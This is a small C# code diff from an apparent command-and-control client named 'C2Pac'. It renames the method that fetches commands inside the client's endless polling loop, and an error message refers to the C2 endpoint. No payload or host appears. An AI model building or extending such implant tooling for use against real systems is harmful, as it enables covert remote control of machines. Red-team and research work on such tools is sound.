@@ -29,7 +29,7 @@ public class C2Pac
 
         while (true)
         {
-            string c2Command = await RetrieveCommandFromHTTPGet();
+            string c2Command = await RetrieveCommand();
             if (c2Command == null)
             {
                 Console.WriteLine("[!] ERROR: Unable to retrieve command, check C2 endpoint.");
